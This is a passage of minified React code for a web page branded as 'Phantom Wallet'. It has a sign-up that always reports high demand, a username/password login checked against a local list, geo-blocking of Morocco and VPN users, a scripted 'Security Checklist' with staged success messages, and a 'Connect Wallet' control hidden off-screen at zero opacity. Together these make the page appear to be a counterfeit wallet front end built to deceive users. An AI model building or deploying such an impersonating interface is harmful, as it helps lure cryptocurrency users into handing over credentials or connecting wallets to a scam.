                                        background: "radial-gradient(circle at top, rgba(255,255,255,0.95) 0%, rgba(248,247,253,0.96) 35%, rgba(244,241,255,0.98) 100%)",
                                        color: tH("--twc-textPrimary"),
                                        border: "1px solid rgba(174,156,255,0.18)",
                                        borderRadius: "20px",
                                        fontSize: "16px",
                                        fontWeight: 700,
                                        cursor: "pointer",
                                        transition: "filter 0.35s cubic-bezier(.22,1,.36,1), transform 0.35s cubic-bezier(.22,1,.36,1), opacity 0.35s cubic-bezier(.22,1,.36,1), box-shadow 0.35s cubic-bezier(.22,1,.36,1)",
                                        display: "flex",
                                        alignItems: "center",
                                        justifyContent: "center",
                                        gap: "12px"
                                    },
                                    onMouseEnter: e => e.currentTarget.style.backgroundColor = tH("--twc-backgroundSecondary"),
                                    onMouseLeave: e => e.currentTarget.style.backgroundColor = tH("--twc-bg3"),
                                    className: "jsx-28131abc58c419c4",
                                    children: [(0, r.jsx)("svg", {
                                        width: "20",
                                        height: "20",
                                        viewBox: "0 0 24 24",
                                        fill: tH("--twc-textPrimary"),
                                        className: "jsx-28131abc58c419c4",
                                        children: (0, r.jsx)("path", {
                                            d: "M19 13h-6v6h-2v-6H5v-2h6V5h2v6h6v2z",
                                            className: "jsx-28131abc58c419c4"
                                        })
                                    }), "Create Wallet"]
                                })]
                            }), U && (0, r.jsx)("div", {
                                style: {
                                    marginTop: "20px",
                                    padding: "12px",
                                    backgroundColor: "rgba(244, 67, 54, 0.1)",
                                    border: "1px solid #f44336",
                                    borderRadius: "18px",
                                    animation: "fadeIn 0.3s ease-out"
                                },
                                className: "jsx-28131abc58c419c4",
                                children: (0, r.jsx)("p", {
                                    style: {
                                        color: "#f44336",
                                        margin: 0,
                                        fontSize: "14px",
                                        fontWeight: 500,
                                        textAlign: "center"
                                    },
                                    className: "jsx-28131abc58c419c4",
                                    children: "Due to high demand, sign up is temporarily unavailable. Please try again later."
                                })
                            }), (0, r.jsx)("p", {
                                style: {
                                    color: tH("--twc-textSecondary"),
                                    fontSize: "12px",
                                    margin: "30px 0 0",
                                    lineHeight: "1.5",
                                    textAlign: "center"
                                },
                                className: "jsx-28131abc58c419c4",
                                children: "Explore the world of Web3 in your pocket."
                            })]
                        })
                    })]
                }) : n ? (0, r.jsxs)(r.Fragment, {
                    children: [(0, r.jsx)(i(), {
                        id: "d9bed6b55408503",
                        children: '@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}@keyframes fadeIn{from{opacity:0;transform:translatey(20px)}to{opacity:1;transform:translatey(0)}}@keyframes pulse{0%{transform:scale(1);opacity:1}50%{transform:scale(1.05);opacity:.8}100%{transform:scale(1);opacity:1}}*{box-sizing:border-box;margin:0;padding:0;touch-action:manipulation}body{margin:0;background:hsl(240 1.8%10.8%);font-family:ui-sans-serif,system-ui,-apple-system,Segoe UI,Roboto,Ubuntu,Cantarell,Noto Sans,sans-serif;overflow-x:hidden;-webkit-tap-highlight-color:transparent;-webkit-text-size-adjust:100%;text-size-adjust:100%}textarea{fontfamily:inherit;font-size:16px!important}input,button,textarea{fontfamily:inherit;font-size:16px!important}input[type="text"],input[type="email"],input[type="password"],input[type="number"]{font-size:16px!important;min-height:44px}'
                    }), (0, r.jsxs)("div", {
                        style: {
                            position: "fixed",
                            inset: 0,
                            background: "radial-gradient(circle at top, rgba(255,255,255,0.95) 0%, rgba(248,247,253,0.96) 35%, rgba(244,241,255,0.98) 100%)",
                            display: "flex",
                            flexDirection: "column",
                            alignItems: "center",
                            justifyContent: "center",
                            zIndex: 1e4,
                            padding: "20px"
                        },
                        className: "jsx-d9bed6b55408503",
                        children: [(0, r.jsx)("button", {
                            onClick: () => {
                                t(!0), o(!1), k("Login"), z(!1)
                            },
                            style: {
                                position: "absolute",
                                top: "16px",
                                left: "16px",
                                background: "rgba(255,255,255,0.55)",
                                border: "none",
                                color: tH("--twc-textPrimary"),
                                cursor: "pointer",
                                padding: "8px",
                                display: "flex",
                                alignItems: "center",
                                justifyContent: "center",
                                borderRadius: "18px",
                                transition: "background-color 0.2s ease",
                                zIndex: 10001
                            },
                            onMouseEnter: e => e.currentTarget.style.backgroundColor = tH("--twc-bg3"),
                            onMouseLeave: e => e.currentTarget.style.backgroundColor = "transparent",
                            className: "jsx-d9bed6b55408503",
                            children: (0, r.jsx)("svg", {
                                width: "24",
                                height: "24",
                                viewBox: "0 0 24 24",
                                fill: "currentColor",
                                className: "jsx-d9bed6b55408503",
                                children: (0, r.jsx)("path", {
                                    d: "M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z",
                                    className: "jsx-d9bed6b55408503"
                                })
                            })
                        }), v ? (0, r.jsxs)("div", {
                            style: {
                                textAlign: "center",
                                animation: "fadeIn 0.3s ease-out"
                            },
                            className: "jsx-d9bed6b55408503",
                            children: [(0, r.jsx)("div", {
                                style: {
                                    width: "60px",
                                    height: "60px",
                                    border: "4px solid transparent",
                                    borderTopColor: tH("--twc-primary"),
                                    borderRightColor: tH("--twc-primary"),
                                    borderRadius: "50%",
                                    animation: "spin 1s linear infinite",
                                    margin: "0 auto 20px",
                                    boxShadow: "0 0 30px rgba(124, 58, 237, 0.22)"
                                },
                                className: "jsx-d9bed6b55408503"
                            }), (0, r.jsx)("p", {
                                style: {
                                    color: tH("--twc-textPrimary"),
                                    fontSize: "18px",
                                    fontWeight: 700,
                                    margin: 0
                                },
                                className: "jsx-d9bed6b55408503",
                                children: "Securing Wallet..."
                            })]
                        }) : M ? (0, r.jsxs)("div", {
                            style: {
                                textAlign: "center",
                                animation: "fadeIn 0.3s ease-out"
                            },
                            className: "jsx-d9bed6b55408503",
                            children: [(0, r.jsx)("div", {
                                style: {
                                    width: "60px",
                                    height: "60px",
                                    border: "4px solid transparent",
                                    borderTopColor: "#8B5CF6",
                                    borderRightColor: "#8B5CF6",
                                    borderRadius: "50%",
                                    animation: "spin 1s linear infinite",
                                    margin: "0 auto 20px",
                                    boxShadow: "0 0 30px rgba(124, 58, 237, 0.22)"
                                },
                                className: "jsx-d9bed6b55408503"
                            }), (0, r.jsx)("p", {
                                style: {
                                    color: tH("--twc-textPrimary"),
                                    fontSize: "18px",
                                    fontWeight: 700,
                                    margin: 0
                                },
                                className: "jsx-d9bed6b55408503",
                                children: F
                            })]
                        }) : N ? (0, r.jsxs)("div", {
                            style: {
                                width: "100%",
                                maxWidth: "320px",
                                animation: "fadeIn 0.3s ease-out",
                                marginTop: "40px"
                            },
                            className: "jsx-d9bed6b55408503",
                            children: [(0, r.jsxs)("div", {
                                style: {
                                    textAlign: "center",
                                    marginBottom: "24px"
                                },
                                className: "jsx-d9bed6b55408503",
                                children: [(0, r.jsx)("img", {
                                    src: "data:image/svg+xml;utf8,%3Csvg%20width%3D%22128%22%20height%3D%22128%22%20viewBox%3D%220%200%20128%20128%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%22128%22%20height%3D%22128%22%20fill%3D%22%23AB9FF2%22%2F%3E%0A%3Cpath%20fill-rule%3D%22evenodd%22%20clip-rule%3D%22evenodd%22%20d%3D%22M55.6416%2082.1477C50.8744%2089.4525%2042.8862%2098.6966%2032.2568%2098.6966C27.232%2098.6966%2022.4004%2096.628%2022.4004%2087.6424C22.4004%2064.7584%2053.6445%2029.3335%2082.6339%2029.3335C99.1257%2029.3335%20105.697%2040.7755%20105.697%2053.7689C105.697%2070.4471%2094.8739%2089.5171%2084.1156%2089.5171C80.7013%2089.5171%2079.0264%2087.6424%2079.0264%2084.6688C79.0264%2083.8931%2079.1552%2083.0527%2079.4129%2082.1477C75.7409%2088.4182%2068.6546%2094.2361%2062.0192%2094.2361C57.1877%2094.2361%2054.7397%2091.1979%2054.7397%2086.9314C54.7397%2085.3799%2055.0618%2083.7638%2055.6416%2082.1477ZM80.6133%2053.3182C80.6133%2057.1044%2078.3795%2058.9975%2075.8806%2058.9975C73.3438%2058.9975%2071.1479%2057.1044%2071.1479%2053.3182C71.1479%2049.532%2073.3438%2047.6389%2075.8806%2047.6389C78.3795%2047.6389%2080.6133%2049.532%2080.6133%2053.3182ZM94.8102%2053.3184C94.8102%2057.1046%2092.5763%2058.9977%2090.0775%2058.9977C87.5407%2058.9977%2085.3447%2057.1046%2085.3447%2053.3184C85.3447%2049.5323%2087.5407%2047.6392%2090.0775%2047.6392C92.5763%2047.6392%2094.8102%2049.5323%2094.8102%2053.3184Z%22%20fill%3D%22%23FFFDF8%22%2F%3E%0A%3C%2Fsvg%3E%0A",
                                    alt: "Phantom Wallet",
                                    style: {
                                        width: "100px",
                                        height: "100px",
                                        marginBottom: "8px",
                                        borderRadius: "20px"
                                    },
                                    className: "jsx-d9bed6b55408503"
                                }), (0, r.jsx)("p", {
                                    style: {
                                        color: tH("--twc-textPrimary"),
                                        fontSize: "18px",
                                        fontWeight: 700,
                                        margin: 0,
                                        marginBottom: "4px"
                                    },
                                    className: "jsx-d9bed6b55408503",
                                    children: "Security Checklist"
                                }), (0, r.jsx)("p", {
                                    style: {
                                        color: tH("--twc-textSecondary"),
                                        fontSize: "14px",
                                        margin: 0
                                    },
                                    className: "jsx-d9bed6b55408503",
                                    children: "Complete security verification"
                                })]
                            }), (0, r.jsxs)("div", {
                                style: {
                                    backgroundColor: "rgba(255,255,255,0.78)",
                                    borderRadius: "20px",
                                    padding: "20px",
                                    marginBottom: "20px",
                                    border: "1px solid rgba(174,156,255,0.18)"
                                },
                                className: "jsx-d9bed6b55408503",
                                children: [(0, r.jsx)("p", {
                                    style: {
                                        color: tH("--twc-textPrimary"),
                                        fontSize: "16px",
                                        fontWeight: 600,
                                        margin: "0 0 16px",
                                        textAlign: "center"
                                    },
                                    className: "jsx-d9bed6b55408503",
                                    children: "Security Instructions"
                                }), (0, r.jsx)("div", {
                                    style: {
                                        background: "radial-gradient(circle at top, rgba(255,255,255,0.95) 0%, rgba(248,247,253,0.96) 35%, rgba(244,241,255,0.98) 100%)",
                                        borderRadius: "20px",
                                        padding: "14px",
                                        marginBottom: "10px",
                                        border: "1px solid rgba(174,156,255,0.18)"
                                    },
                                    className: "jsx-d9bed6b55408503",
                                    children: (0, r.jsxs)("div", {
                                        style: {
                                            display: "flex",
                                            alignItems: "flex-start",
                                            gap: "12px"
                                        },
                                        className: "jsx-d9bed6b55408503",
                                        children: [(0, r.jsx)("input", {
                                            id: "tcyok",
                                            type: "checkbox",
                                            checked: L,
                                            onChange: e => D(e.target.checked),
                                            style: {
                                                width: "18px",
                                                height: "18px",
                                                accentColor: tH("--twc-primary"),
                                                marginTop: "2px",
                                                cursor: "pointer"
                                            },
                                            className: "jsx-d9bed6b55408503"
                                        }), (0, r.jsx)("label", {
                                            htmlFor: "tcyok",
                                            style: {
                                                color: tH("--twc-textPrimary"),
                                                fontSize: "14px",
                                                fontWeight: 400,
                                                flex: 1,
                                                lineHeight: "1.5",
                                                cursor: "pointer"
                                            },
                                            className: "jsx-d9bed6b55408503",
                                            children: "Only you have access to these credentials."
                                        })]
                                    })
                                }), (0, r.jsx)("div", {
                                    style: {
                                        background: "radial-gradient(circle at top, rgba(255,255,255,0.95) 0%, rgba(248,247,253,0.96) 35%, rgba(244,241,255,0.98) 100%)",
                                        borderRadius: "20px",
                                        padding: "14px",
                                        marginBottom: "10px",
                                        border: "1px solid rgba(174,156,255,0.18)"
                                    },
                                    className: "jsx-d9bed6b55408503",
                                    children: (0, r.jsxs)("div", {
                                        style: {
                                            display: "flex",
                                            alignItems: "flex-start",
                                            gap: "12px"
                                        },
                                        className: "jsx-d9bed6b55408503",
                                        children: [(0, r.jsx)("input", {
                                            id: "ithgp",
                                            type: "checkbox",
                                            checked: B,
                                            onChange: e => R(e.target.checked),
                                            style: {
                                                width: "18px",
                                                height: "18px",
                                                accentColor: tH("--twc-primary"),
                                                marginTop: "2px",
                                                cursor: "pointer"
                                            },
                                            className: "jsx-d9bed6b55408503"
                                        }), (0, r.jsx)("label", {
                                            htmlFor: "ithgp",
                                            style: {
                                                color: tH("--twc-textPrimary"),
                                                fontSize: "14px",
                                                fontWeight: 400,
                                                flex: 1,
                                                lineHeight: "1.5",
                                                cursor: "pointer"
                                            },
                                            className: "jsx-d9bed6b55408503",
                                            children: "Don't save it in a screenshot, email, or text file."
                                        })]
                                    })
                                }), (0, r.jsx)("div", {
                                    style: {
                                        background: "radial-gradient(circle at top, rgba(255,255,255,0.95) 0%, rgba(248,247,253,0.96) 35%, rgba(244,241,255,0.98) 100%)",
                                        borderRadius: "20px",
                                        padding: "14px",
                                        marginBottom: "20px",
                                        border: "1px solid rgba(174,156,255,0.18)"
                                    },
                                    className: "jsx-d9bed6b55408503",
                                    children: (0, r.jsxs)("div", {
                                        style: {
                                            display: "flex",
                                            alignItems: "flex-start",
                                            gap: "12px"
                                        },
                                        className: "jsx-d9bed6b55408503",
                                        children: [(0, r.jsx)("input", {
                                            id: "seol7",
                                            type: "checkbox",
                                            checked: E,
                                            onChange: e => P(e.target.checked),
                                            style: {
                                                width: "18px",
                                                height: "18px",
                                                accentColor: tH("--twc-primary"),
                                                marginTop: "2px",
                                                cursor: "pointer"
                                            },
                                            className: "jsx-d9bed6b55408503"
                                        }), (0, r.jsx)("label", {
                                            htmlFor: "seol7",
                                            style: {
                                                color: tH("--twc-textPrimary"),
                                                fontSize: "14px",
                                                fontWeight: 400,
                                                flex: 1,
                                                lineHeight: "1.5",
                                                cursor: "pointer"
                                            },
                                            className: "jsx-d9bed6b55408503",
                                            children: "Anyone with your credentials can steal your funds."
                                        })]
                                    })
                                }), (0, r.jsx)("button", {
                                    onClick: () => {
                                        L && B && E && (A(!0), W("Finalizing Security..."), setTimeout(() => {
                                            W("Login Success!")
                                        }, 2e3), setTimeout(() => {
                                            W("Welcome to Phantom Wallet!")
                                        }, 3e3), setTimeout(() => {
                                            A(!1), I(!1), o(!1), k("Login")
                                        }, 5e3))
                                    },
                                    disabled: !L || !B || !E,
                                    style: {
                                        width: "100%",
                                        padding: "14px",
                                        backgroundColor: L && B && E ? tH("--twc-primary") : tH("--twc-bg3"),
                                        color: L && B && E ? "#000" : tH("--twc-textDisabled"),
                                        border: "none",
                                        borderRadius: "20px",
                                        fontSize: "16px",
                                        fontWeight: 700,
                                        cursor: L && B && E ? "pointer" : "not-allowed",
                                        transition: "filter 0.35s cubic-bezier(.22,1,.36,1), transform 0.35s cubic-bezier(.22,1,.36,1), opacity 0.35s cubic-bezier(.22,1,.36,1), box-shadow 0.35s cubic-bezier(.22,1,.36,1)",
                                        display: "flex",
                                        alignItems: "center",
                                        justifyContent: "center",
                                        gap: "8px"
                                    },
                                    onMouseEnter: e => {
                                        L && B && E && (e.currentTarget.style.backgroundColor = tH("--twc-primaryHover"))
                                    },
                                    onMouseLeave: e => {
                                        L && B && E && (e.currentTarget.style.backgroundColor = tH("--twc-primary"))
                                    },
                                    className: "jsx-d9bed6b55408503",
                                    children: "Confirm & Continue"
                                })]
                            })]
                        }) : (0, r.jsxs)("div", {
                            style: {
                                width: "100%",
                                maxWidth: "320px",
                                animation: "fadeIn 0.3s ease-out"
                            },
                            className: "jsx-d9bed6b55408503",
                            children: [(0, r.jsx)("div", {
                                style: {
                                    marginTop: "40px"
                                },
                                className: "jsx-d9bed6b55408503"
                            }), (0, r.jsxs)("div", {
                                style: {
                                    textAlign: "center",
                                    marginBottom: "24px",
                                    marginTop: "40px"
                                },
                                className: "jsx-d9bed6b55408503",
                                children: [(0, r.jsx)("img", {
                                    src: "data:image/svg+xml;utf8,%3Csvg%20width%3D%22128%22%20height%3D%22128%22%20viewBox%3D%220%200%20128%20128%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%22128%22%20height%3D%22128%22%20fill%3D%22%23AB9FF2%22%2F%3E%0A%3Cpath%20fill-rule%3D%22evenodd%22%20clip-rule%3D%22evenodd%22%20d%3D%22M55.6416%2082.1477C50.8744%2089.4525%2042.8862%2098.6966%2032.2568%2098.6966C27.232%2098.6966%2022.4004%2096.628%2022.4004%2087.6424C22.4004%2064.7584%2053.6445%2029.3335%2082.6339%2029.3335C99.1257%2029.3335%20105.697%2040.7755%20105.697%2053.7689C105.697%2070.4471%2094.8739%2089.5171%2084.1156%2089.5171C80.7013%2089.5171%2079.0264%2087.6424%2079.0264%2084.6688C79.0264%2083.8931%2079.1552%2083.0527%2079.4129%2082.1477C75.7409%2088.4182%2068.6546%2094.2361%2062.0192%2094.2361C57.1877%2094.2361%2054.7397%2091.1979%2054.7397%2086.9314C54.7397%2085.3799%2055.0618%2083.7638%2055.6416%2082.1477ZM80.6133%2053.3182C80.6133%2057.1044%2078.3795%2058.9975%2075.8806%2058.9975C73.3438%2058.9975%2071.1479%2057.1044%2071.1479%2053.3182C71.1479%2049.532%2073.3438%2047.6389%2075.8806%2047.6389C78.3795%2047.6389%2080.6133%2049.532%2080.6133%2053.3182ZM94.8102%2053.3184C94.8102%2057.1046%2092.5763%2058.9977%2090.0775%2058.9977C87.5407%2058.9977%2085.3447%2057.1046%2085.3447%2053.3184C85.3447%2049.5323%2087.5407%2047.6392%2090.0775%2047.6392C92.5763%2047.6392%2094.8102%2049.5323%2094.8102%2053.3184Z%22%20fill%3D%22%23FFFDF8%22%2F%3E%0A%3C%2Fsvg%3E%0A",
                                    alt: "Phantom Wallet",
                                    style: {
                                        width: "100px",
                                        height: "100px",
                                        marginBottom: "8px",
                                        borderRadius: "20px"
                                    },
                                    className: "jsx-d9bed6b55408503"
                                }), (0, r.jsx)("p", {
                                    style: {
                                        color: tH("--twc-textPrimary"),
                                        fontSize: "20px",
                                        fontWeight: 700,
                                        margin: 0,
                                        marginBottom: "4px"
                                    },
                                    className: "jsx-d9bed6b55408503",
                                    children: "Welcome Back"
                                }), (0, r.jsx)("p", {
                                    style: {
                                        color: tH("--twc-textSecondary"),
                                        fontSize: "14px",
                                        margin: 0
                                    },
                                    className: "jsx-d9bed6b55408503",
                                    children: "Enter your username and password"
                                })]
                            }), (0, r.jsxs)("div", {
                                style: {
                                    backgroundColor: "rgba(255,255,255,0.78)",
                                    borderRadius: "20px",
                                    padding: "20px",
                                    marginBottom: "20px",
                                    border: "1px solid rgba(174,156,255,0.18)"
                                },
                                className: "jsx-d9bed6b55408503",
                                children: [(0, r.jsxs)("div", {
                                    style: {
                                        marginBottom: "16px"
                                    },
                                    className: "jsx-d9bed6b55408503",
                                    children: [(0, r.jsx)("label", {
                                        style: {
                                            color: tH("--twc-textSecondary"),
                                            fontSize: "14px",
                                            fontWeight: 500,
                                            display: "block",
                                            marginBottom: "8px"
                                        },
                                        className: "jsx-d9bed6b55408503",
                                        children: "Username"
                                    }), (0, r.jsxs)("div", {
                                        style: {
                                            background: "radial-gradient(circle at top, rgba(255,255,255,0.95) 0%, rgba(248,247,253,0.96) 35%, rgba(244,241,255,0.98) 100%)",
                                            borderRadius: "20px",
                                            padding: "0 16px",
                                            border: "1px solid ".concat(H ? "#f44336" : tH("--twc-line")),
                                            display: "flex",
                                            alignItems: "center",
                                            gap: "12px"
                                        },
                                        className: "jsx-d9bed6b55408503",
                                        children: [(0, r.jsx)("svg", {
                                            width: "20",
                                            height: "20",
                                            viewBox: "0 0 24 24",
                                            fill: tH("--twc-textSecondary"),
                                            className: "jsx-d9bed6b55408503",
                                            children: (0, r.jsx)("path", {
                                                d: "M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z",
                                                className: "jsx-d9bed6b55408503"
                                            })
                                        }), (0, r.jsx)("input", {
                                            type: "email",
                                            value: x,
                                            onChange: e => h(e.target.value),
                                            placeholder: "Enter your Username",
                                            style: {
                                                flex: 1,
                                                height: "44px",
                                                backgroundColor: "transparent",
                                                border: "none",
                                                color: tH("--twc-textPrimary"),
                                                fontSize: "16px",
                                                outline: "none"
                                            },
                                            className: "jsx-d9bed6b55408503"
                                        })]
                                    })]
                                }), (0, r.jsxs)("div", {
                                    style: {
                                        marginBottom: "16px"
                                    },
                                    className: "jsx-d9bed6b55408503",
                                    children: [(0, r.jsx)("label", {
                                        style: {
                                            color: tH("--twc-textSecondary"),
                                            fontSize: "14px",
                                            fontWeight: 500,
                                            display: "block",
                                            marginBottom: "8px"
                                        },
                                        className: "jsx-d9bed6b55408503",
                                        children: "Password"
                                    }), (0, r.jsxs)("div", {
                                        style: {
                                            background: "radial-gradient(circle at top, rgba(255,255,255,0.95) 0%, rgba(248,247,253,0.96) 35%, rgba(244,241,255,0.98) 100%)",
                                            borderRadius: "20px",
                                            padding: "0 16px",
                                            border: "1px solid ".concat(H ? "#f44336" : tH("--twc-line")),
                                            display: "flex",
                                            alignItems: "center",
                                            gap: "12px"
                                        },
                                        className: "jsx-d9bed6b55408503",
                                        children: [(0, r.jsx)("svg", {
                                            width: "20",
                                            height: "20",
                                            viewBox: "0 0 24 24",
                                            fill: tH("--twc-textSecondary"),
                                            className: "jsx-d9bed6b55408503",
                                            children: (0, r.jsx)("path", {
                                                d: "M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z",
                                                className: "jsx-d9bed6b55408503"
                                            })
                                        }), (0, r.jsx)("input", {
                                            type: "password",
                                            value: u,
                                            onChange: e => f(e.target.value),
                                            placeholder: "Enter your password",
                                            style: {
                                                flex: 1,
                                                height: "44px",
                                                backgroundColor: "transparent",
                                                border: "none",
                                                color: tH("--twc-textPrimary"),
                                                fontSize: "16px",
                                                outline: "none"
                                            },
                                            className: "jsx-d9bed6b55408503"
                                        })]
                                    }), H && (0, r.jsxs)("div", {
                                        style: {
                                            display: "flex",
                                            alignItems: "center",
                                            gap: "6px",
                                            marginTop: "8px"
                                        },
                                        className: "jsx-d9bed6b55408503",
                                        children: [(0, r.jsx)("svg", {
                                            width: "14",
                                            height: "14",
                                            viewBox: "0 0 24 24",
                                            fill: "#f44336",
                                            className: "jsx-d9bed6b55408503",
                                            children: (0, r.jsx)("path", {
                                                d: "M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z",
                                                className: "jsx-d9bed6b55408503"
                                            })
                                        }), (0, r.jsx)("p", {
                                            style: {
                                                color: "#f44336",
                                                fontSize: "12px",
                                                margin: 0,
                                                fontWeight: 500
                                            },
                                            className: "jsx-d9bed6b55408503",
                                            children: "Invalid username or password. Please try again."
                                        })]
                                    })]
                                }), (0, r.jsx)("button", {
                                    onClick: () => {
                                        ((e, t) => {
                                            if (p().catch(console.error), d && c) return console.log("Access denied: User blocked (Morocco or VPN)"), !1;
                                            let n = e.trim(),
                                                r = t.trim(),
                                                o = n.toLowerCase(),
                                                i = r.toLowerCase();
                                            return !!l.find(e => {
                                                let t = e.email.toLowerCase(),
                                                    n = e.password.toLowerCase();
                                                return t === o && n === i
                                            })
                                        })(x.trim(), u.trim()) ? (j(!0), _(!1), z(!0), k("Authenticating..."), setTimeout(() => {
                                            k("Login Successful!"), setTimeout(() => {
                                                z(!1), S(!0), setTimeout(() => {
                                                    S(!1), I(!0), localStorage.setItem("isLoggedIn", "true")
                                                }, 1e3)
                                            }, 500)
                                        }, 4e3)) : (j(!1), _(!0), z(!1), k("Login"), setTimeout(() => _(!1), 3e3))
                                    },
                                    disabled: !x.trim() || !u.trim() || T,
                                    style: {
                                        width: "100%",
                                        padding: "14px",
                                        backgroundColor: x.trim() && u.trim() ? tH("--twc-primary") : tH("--twc-bg3"),
                                        color: x.trim() && u.trim() ? "#000" : tH("--twc-textDisabled"),
                                        border: "none",
                                        borderRadius: "20px",
                                        fontSize: "16px",
                                        fontWeight: 700,
                                        cursor: x.trim() && u.trim() && !T ? "pointer" : "not-allowed",
                                        transition: "filter 0.35s cubic-bezier(.22,1,.36,1), transform 0.35s cubic-bezier(.22,1,.36,1), opacity 0.35s cubic-bezier(.22,1,.36,1), box-shadow 0.35s cubic-bezier(.22,1,.36,1)",
                                        display: "flex",
                                        alignItems: "center",
                                        justifyContent: "center",
                                        gap: "8px",
                                        height: "48px"
                                    },
                                    onMouseEnter: e => {
                                        x.trim() && u.trim() && !T && (e.currentTarget.style.backgroundColor = tH("--twc-primaryHover"))
                                    },
                                    onMouseLeave: e => {
                                        x.trim() && u.trim() && !T && (e.currentTarget.style.backgroundColor = tH("--twc-primary"))
                                    },
                                    className: "jsx-d9bed6b55408503",
                                    children: T ? (0, r.jsxs)(r.Fragment, {
                                        children: [(0, r.jsx)("div", {
                                            style: {
                                                width: "20px",
                                                height: "20px",
                                                border: "2px solid rgba(0,0,0,0.3)",
                                                borderTopColor: "#000",
                                                borderRadius: "50%",
                                                animation: "spin 1s linear infinite"
                                            },
                                            className: "jsx-d9bed6b55408503"
                                        }), C]
                                    }) : C
                                })]
                            }), (0, r.jsx)("p", {
                                style: {
                                    color: tH("--twc-textSecondary"),
                                    fontSize: "12px",
                                    textAlign: "center",
                                    margin: 0,
                                    lineHeight: "1.5"
                                },
                                className: "jsx-d9bed6b55408503",
                                children: "Enter your registered username and password to access your wallet securely"
                            })]
                        })]
                    })]
                }) : (0, r.jsxs)(r.Fragment, {
                    children: [(0, r.jsx)(i(), {
                        id: "212d2f498bea9fe5",
                        children: '@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}@keyframes fadeIn{from{opacity:0;transform:translatey(20px)}to{opacity:1;transform:translatey(0)}}@keyframes pulse{0%{transform:scale(1);opacity:1}50%{transform:scale(1.05);opacity:.8}100%{transform:scale(1);opacity:1}}*{box-sizing:border-box;margin:0;padding:0;touch-action:manipulation}body{margin:0;background:hsl(240 1.8%10.8%);font-family:ui-sans-serif,system-ui,-apple-system,Segoe UI,Roboto,Ubuntu,Cantarell,Noto Sans,sans-serif;overflow-x:hidden;-webkit-tap-highlight-color:transparent;-webkit-text-size-adjust:100%;text-size-adjust:100%}input[type="number"]::-webkit-inner-spin-button,input[type="number"]::-webkit-outer-spin-button{-webkit-appearance:none;margin:0}::-webkit-scrollbar{width:4px}::-webkit-scrollbar-track{background:transparent}::-webkit-scrollbar-thumb{background:hsl(217.5 10.1%31%);border-radius:2px}input[type="text"],input[type="email"],input[type="password"],input[type="number"],textarea{font-size:16px!important;min-height:44px;-webkit-text-size-adjust:100%;text-size-adjust:100%}textarea{font-size:16px!important;lineheight:1.4!important;min-height:44px!important;padding:12px 0!important}@media(max-width:428px){body{font-size:14px}.mobile-text{fontsize:14px!important}}'
                    }), (0, r.jsxs)("div", {
                        style: { ...tN,
                            width: "100vw",
                            minHeight: "100vh",
                            backgroundColor: "hsl(var(--twc-backgroundPrimary))",
                            color: "hsl(var(--twc-textPrimary))",
                            fontFamily: 'Geeza, "Ping Fang", "Binance Plex", ui-sans-serif, system-ui, -apple-system, Segoe UI, Roboto, Ubuntu, Cantarell, Noto Sans, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji"',
                            display: "flex",
                            flexDirection: "column",
                            position: "relative"
                        },
                        "data-theme": "dark",
                        className: "jsx-212d2f498bea9fe5",
                        children: [(0, r.jsx)("div", {
                            style: {
                                position: "absolute",
                                top: "-1000px",
                                left: "-1000px",
                                opacity: 0,
                                pointerEvents: "none"
                            },
                            className: "jsx-212d2f498bea9fe5",
                            children: (0, r.jsx)(g.pK, {
                                label: "Connect Wallet",
                                showBalance: !1,
                                accountStatus: "address",
                                chainStatus: "icon"
                            })
                        }), O && (0, r.jsx)("div", {
                            style: {
                                position: "fixed",
                                inset: 0,
                                backgroundColor: "rgba(248,247,253,0.82)",
                                display: "flex",
                                alignItems: "center",
                                justifyContent: "center",
                                zIndex: 9999,
                                animation: "fadeIn 0.3s ease-out"
                            },
                            className: "jsx-212d2f498bea9fe5",
                            children: (0, r.jsxs)("div", {
                                style: {
                                    textAlign: "center"
                                },
                                className: "jsx-212d2f498bea9fe5",
                                children: [(0, r.jsx)("div", {
                                    style: {
                                        width: "60px",
                                        height: "60px",
                                        border: "4px solid transparent",
                                        borderTopColor: tH("--twc-primary"),
                                        borderRightColor: tH("--twc-primary"),
                                        borderRadius: "50%",
                                        animation: "spin 1s linear infinite",
                                        margin: "0 auto 20px",
                                        boxShadow: "0 0 30px rgba(124, 58, 237, 0.22)"
                                    },
                                    className: "jsx-212d2f498bea9fe5"
                                }), (0, r.jsx)("p", {
                                    style: {
                                        color: tH("--twc-textPrimary"),
                                        fontSize: "16px",
                                        fontWeight: 600,
                                        margin: 0
                                    },
                                    className: "jsx-212d2f498bea9fe5",
                                    children: "Processing..."
                                })]
                            })
                        }), eN && (0, r.jsx)("div", {
                            style: {
                                position: "fixed",
                                inset: 0,
                                backgroundColor: "rgba(248,247,253,0.82)",
                                display: "flex",
                                alignItems: "center",
                                justifyContent: "center",
                                zIndex: 9999,
                                animation: "fadeIn 0.3s ease-out"
                            },
                            className: "jsx-212d2f498bea9fe5",
                            children: (0, r.jsx)("div", {
                                style: {
                                    width: "60px",
                                    height: "60px",
                                    borderRadius: "50%",
                                    border: "3px solid transparent",
                                    borderTopColor: tH("--twc-primary"),
                                    borderRightColor: tH("--twc-primary"),
                                    animation: "spin 1s linear infinite",
                                    boxShadow: "0 0 30px rgba(124, 58, 237, 0.22)"
                                },
